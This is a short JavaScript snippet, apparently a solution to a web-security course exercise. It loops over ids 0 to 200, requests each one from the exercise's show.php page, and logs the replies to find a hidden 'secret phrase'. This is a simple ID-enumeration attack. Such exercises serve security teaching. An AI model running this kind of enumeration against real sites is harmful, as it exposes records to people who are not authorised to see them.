// You can run this in the console and see the answer in the output

for (var i = 0; i <=200; i++) {
  $.get('http://cliu2014.scripts.mit.edu/6470-jungle-security/prob1-jungle-maze/show.php',
    {id:i},
    function(data) {
      console.log(data); // View console to see what the secret phrase is.
    }
  );
} 